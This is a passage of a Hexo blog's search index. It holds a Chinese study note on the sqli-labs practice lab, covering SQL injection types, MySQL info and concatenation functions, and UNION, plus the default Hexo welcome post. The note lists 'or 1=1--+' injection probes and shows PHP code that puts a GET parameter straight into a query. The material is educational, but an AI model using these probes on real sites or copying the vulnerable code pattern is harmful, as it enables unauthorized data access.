class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   start = time.time()</span><br><span class="line">   loop = asyncio.get_event_loop()</span><br><span class="line">   loop.run_until_complete(main())</span><br><span class="line">   stop = time.time()</span><br><span class="line">   <span class="built_in">print</span>(stop - start)</span><br></pre></td></tr></table></figure><strong>done</strong></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Sqli Labs-01</title>
      <link href="/5706.html"/>
      <url>/5706.html</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="SQL注入分类"><a href="#SQL注入分类" class="headerlink" title="SQL注入分类"></a>SQL注入分类</h2><p><strong>基于从服务器接收到的响应</strong></p><ul><li> 基于错误SQL注入</li><li> 联合查询的类型</li><li> 堆查询注射</li><li><pre><code>SQL盲注</code></pre></li></ul><ul><li> 基于布尔SQL盲注</li><li> 基于时间的SQL盲注</li><li> 基于报错的SQL盲注</li></ul><p><strong>基于如何处理输入的SQL查询（数据类型）</strong></p><ul><li> 基于字符串</li><li> 数字或整数为基础的</li></ul><p><strong>基于程度和顺序的注入（哪里发生了影响）</strong></p><ul><li> 一阶注入</li><li> 二阶注入<br>一阶注入是指输入的输入语句对WEB直接产生了影响，出现了结果；二阶注入是指输入提交的语句无法直接对WEB应用程序产生影响，通过对其他的辅助间接对WEB产生危害。</li></ul><h2 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h2><ol><li>version() – MySQL版本</li><li>user() – 数据库用户名</li><li>database() – 数据库名</li><li>@@datadir – 数据库路径</li><li>@@version_compile_os – 操作系统版本</li></ol><h2 id="字符连接函数"><a href="#字符连接函数" class="headerlink" title="字符连接函数"></a>字符连接函数</h2><ol><li>concat(str1,str2,…) – 没有分隔符的连接字符串</li><li>concat_ws(separator,str1,str2,…) – 含有分隔符地连接字符串</li><li>group_concat(str1,str2,…) – 连接一个组的所有字符串，并以逗号分隔每一条数据<br>三个函数能一次性查出所有信息</li></ol><h2 id="一般用于尝试的语句"><a href="#一般用于尝试的语句" class="headerlink" title="一般用于尝试的语句"></a>一般用于尝试的语句</h2><p><strong>PS:</strong> –+可以用#替换，url提交过程中编码后为%23</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">or 1=1--+</span><br><span class="line">&#x27;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&#x27;)or 1=1--+</span><br><span class="line">&quot;)or 1=1--+</span><br><span class="line">))or 1=1--+</span><br></pre></td></tr></table></figure><p>一般代码为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE id = &#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><h2 id="UNION操作符介绍"><a href="#UNION操作符介绍" class="headerlink" title="UNION操作符介绍"></a>UNION操作符介绍</h2><p>UNION操作符用于合并两个或多个SELECT语句的结果集。请注意，UNION内部的SELECT语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条SELECT语句中的列顺序必须相同。<br><strong>SQL UNION 语法</strong><br>SELECT column_name(s) FROM table_name1<br>UNION<br>SELECT column_name(s) FROM table_name2<br>另外，UNION结果集中列名总是等于UNION中的第一个SELECT语句中的列名。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/16107.html"/>
      <url>/16107.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
